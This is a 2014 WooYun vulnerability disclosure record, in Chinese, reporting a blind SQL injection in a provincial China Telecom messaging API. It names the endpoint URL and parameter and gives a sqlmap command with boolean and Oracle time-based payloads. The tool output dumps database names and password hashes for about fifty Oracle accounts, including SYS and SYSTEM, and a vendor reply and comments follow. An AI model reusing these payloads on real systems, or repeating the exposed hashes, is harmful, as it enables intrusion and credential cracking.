{"id": 1476, "wybug_id": "wooyun-2014-069898", "wybug_title": "某省电信Oracle数据库SQL注射", "wybug_corp": "中国电信", "wybug_author": "超威蓝猫", "wybug_date": "2014-07-27 19:21", "wybug_open_date": "2014-09-10 19:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-10：\t细节向公众公开  简要描述： 某省电信Oracle数据库SQL注射 详细说明：  \"偶然\"得到浙江电信多个APP通用的短信发送接口 http://api.zj189.cn/sendmessage.php?wsdl 于是随手一搜搜到了: http://api.zj189.cn/lxjkweb/index.php/Message/p?notice=1&p=3notice参数存在AND/OR布尔型SQL盲注 ._.后端是Oracle数据库 炒鸡多内容也 感菊是一个蛮重要的库   漏洞证明：  \n\n\nsqlmap.py -u \"http://api.zj189.cn/lxjkweb/index.php/Message/p?notice=1&p=3\" --dbs --passwords --current-user --current-db\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: notice    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: notice=1 AND 2927=2927&p=3    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: notice=1 AND 3941=DBMS_PIPE.RECEIVE_MESSAGE(CHR(75)||CHR(120)||CHR(97)||CHR(116),5)&p=3---web application technology: Apache 2.4.1back-end DBMS: Oraclecurrent user:    'YGDXADMIN'current schema (equivalent to database on Oracle):    'YGDXADMIN'database management system users password hashes:[*] ANONYMOUS [1]:    password hash: anonymous[*] CTXSYS [1]:    password hash: 71E687F036AD56E5[*] CXLMADMIN [1]:    password hash: 67C4C119718BF51B[*] DATAADMIN [1]:    password hash: 6417A35B9ADAC79B[*] DBSNMP [1]:    password hash: D6C61CF5753C1269[*] DIP [1]:    password hash: CE4A36B8E06CA59C[*] DMSYS [1]:    password hash: BFBA5A553FD9E28A[*] EMAILLISTADMIN [1]:    password hash: B6552DA37248915B[*] EXFSYS [1]:    password hash: 66F4EF5650C20355[*] FAXSMSADMIN [1]:    password hash: EFFF31A3D5531CE2[*] I229ADMIN [1]:    password hash: BFC666DF2C72AD54[*] JTPT106 [1]:    password hash: 7768EF1C1B22A70E[*] JTPTADMIN [1]:    password hash: BA031B8189337F2D[*] LXT_XML [1]:    password hash: 2DB325CECFC938C8[*] MAIL189DZZD [1]:    password hash: 0393E45FA5A552E8[*] MDDATA [1]:    password hash: DF02A496267DEE66[*] MDSYS [1]:    password hash: 72979A94BAD2AF80[*] MGMT_VIEW [1]:    password hash: 4F538DF5F344F348[*] MKSENDEMAIL [1]:    password hash: F64A6BE5246B1CB3[*] MMS118320 [1]:    password hash: CCC26111185ED789[*] OLAPSYS [1]:    password hash: 3FB8EF9DB538647C[*] ORDPLUGINS [1]:    password hash: 88A2B2C183431F00[*] ORDSYS [1]:    password hash: 7EFA02EC7EA6B86F[*] OUTLN [1]:    password hash: 4A3BA55E08595C81[*] P2PDXADMIN [1]:    password hash: 2C77F9077558A0D0[*] PAADMIN [1]:    password hash: 8C7D67D288FAD784[*] PMASADMIN [1]:    password hash: B9BDA80AE91C6803[*] PMASTEST [1]:    password hash: 38B4D06568F7EC99[*] PMASTMP [1]:    password hash: B024A06CC0E14630[*] PROXY [1]:    password hash: 40D979522DBC79EE[*] QDDADMIN [1]:    password hash: 77D3694303EA2F46[*] RPTADMIN [1]:    password hash: 74339B0E19DE3533[*] SCOTT [1]:    password hash: F894844C34402B67[*] SHAREADMIN [1]:    password hash: 9221FFEE77FF4BD5[*] SHORTURLADMIN [1]:    password hash: 75D081E65F5FA750[*] SHORTURLFOR3G [1]:    password hash: 0579293097787CC1[*] SI_INFORMTN_SCHEMA [1]:    password hash: 84B8CBCA4D477FA3[*] SMSLOTTERY [1]:    password hash: 99C16AD07C603AE0[*] SMSPAY [1]:    password hash: B5E6C25BB0F54505[*] SPOTLIGHT [1]:    password hash: 4F541E3C312BCFC9[*] SYS [1]:    password hash: 724D7F97DD8C2367[*] SYSMAN [1]:    password hash: C29602BEA72C062C[*] SYSTEM [1]:    password hash: 736C1AE9EB53294F[*] TSMSYS [1]:    password hash: 3DF26A8B17D0F29F[*] TZPKADMIN [1]:    password hash: 1AC17E6F49812333[*] UPCOREADMIN [1]:    password hash: 565C88F0470D7BF6[*] WMSYS [1]:    password hash: 7C9BA362F8314299[*] XDB [1]:    password hash: 88D8364765FCE6AF[*] YGDXADMIN [1]:    password hash: 3459B5F55FBB9D6A[*] YGPKADMIN [1]:    password hash: 0EF9E9B4ACF6682F[*] ZJDATAADMIN [1]:    password hash: 9FDF087AEB99EB40[*] ZJDATAZJADMIN [1]:    password hash: 44E291DD837A5F47[*] ZJTERMADMIN [1]:    password hash: 9191A775CE9AF286available databases [44]:[*] CTXSYS[*] CXLMADMIN[*] DATAADMIN[*] DBSNMP[*] DMSYS[*] EMAILLISTADMIN[*] EXFSYS[*] FAXSMSADMIN[*] JTPT106[*] JTPTADMIN[*] LXT_XML[*] MAIL189DZZD[*] MDSYS[*] MKSENDEMAIL[*] MMS118320[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] P2PDXADMIN[*] PAADMIN[*] PMASADMIN[*] PMASTEST[*] PMASTMP[*] QDDADMIN[*] RPTADMIN[*] SCOTT[*] SHAREADMIN[*] SHORTURLADMIN[*] SMSLOTTERY[*] SMSPAY[*] SPOTLIGHT[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] TZPKADMIN[*] UPCOREADMIN[*] WMSYS[*] XDB[*] YGDXADMIN[*] YGPKADMIN[*] ZJDATAADMIN[*] ZJDATAZJADMIN[*] ZJTERMADMIN\n   修复方案：  电信更专业   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-07-31 21:54 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT直接通报给中国电信集团公司，建议其加强移动应用服务端防护。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-27 19:24 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  楼主专注运营商三十年啊    \n     2014-07-27 20:52 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  你持积极态度哦    \n     2014-07-27 21:00 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @魇 你吃JJ太多    \n     2014-07-27 21:38 |    \t\tAres \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 来自幼儿园大班)\t\t \n  电信再来一发。电信妹子表示很惆怅。    \n     2014-07-27 22:23 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  小伙子，看你的骨骼精奇，是万中无一的练武奇才，维护世界和平就靠你了，我这里有个修炼的秘籍，《zone技术问答领域欢迎你》就免费送给你了.    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}